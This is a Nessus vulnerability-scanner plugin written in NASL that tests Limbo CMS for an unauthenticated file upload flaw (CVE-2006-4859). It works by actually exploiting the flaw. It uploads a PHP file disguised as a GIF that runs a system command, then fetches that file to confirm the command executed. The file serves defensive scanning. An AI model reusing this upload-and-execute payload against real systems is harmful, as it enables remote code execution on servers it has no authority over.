#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(22367);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-4859");
  script_bugtraq_id(20044);
  script_xref(name:"OSVDB", value:"31011");

  script_name(english:"Limbo Contact Component (com_contact) contact.html.php contact_attach Unrestricted File Upload");
  script_summary(english:"Tries to upload a file with PHP code in Limbo CMS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows uploading
of arbitrary files." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Limbo CMS, a content-management system
written in PHP. 

The 'com_contact' component of the version of Limbo installed on the
remote host allows an unauthenticated remote attacker to upload
arbitrary files to a known directory within the web server's document
root.  Provided PHP's 'file_uploads' setting is enabled, which is true
by default, this flaw can be exploited to execute arbitrary code on
the affected host, subject to the privileges of the web server user
id." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2370" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/limbo", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (isnull(res)) exit(0);

  # Grab an item id.
  pat = '&amp;Itemid=([0-9]+)" class=';
  matches = egrep(pattern:pat, string:res);
  item_id = NULL;
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      item_id = eregmatch(pattern:pat, string:match);
      if (!isnull(item_id)) {
        item_id = item_id[1];
        break;
      }
    }
  }

  # If we have one...
  if (!isnull(item_id))
  {
    # Try to exploit the flaw to upload a file that will run a command.
    cmd = "id";
    fname = string("nessus-", unixtime(), ".gif.php");
    boundary = "bound";
    req = string(
      "POST ",  dir, "/index.php?option=contact&Itemid=", item_id, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="contact_name";', "\r\n",
      "\r\n",
      SCRIPT_NAME, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="contact_email";', "\r\n",
      "\r\n",
      "nessus@", this_host(), "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="contact_subject";', "\r\n",
      "\r\n",
      "Test of ", SCRIPT_NAME, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="contact_text";', "\r\n",
      "\r\n",
      "Test of ", SCRIPT_NAME, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="task";', "\r\n",
      "\r\n",
      "post\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="send";', "\r\n",
      "\r\n",
      "Send\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="contact_attach"; filename="', fname, '";', "\r\n",
      "Content-Type: image/gif;\r\n",
      "\r\n",
      '<?php\r\n',
      'system(', cmd, ');\r\n',
      '?>\r\n',
      '\r\n',

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (isnull(res)) exit(0);

    # Now call the file we just uploaded.
    req = http_get(item:string(dir, "/images/contact/", fname), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (isnull(res)) exit(0);

    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      if (report_verbosity < 1) security_hole(port);
      else
      {
        report = string(
          "\n",
          "Nessus was able to execute the command 'id' on the remote host,\n",
          "which produced the following output :\n",
          "\n",
          line
        );
        security_hole(port:port, extra:report);
      }

      exit(0);
    }
  }
}
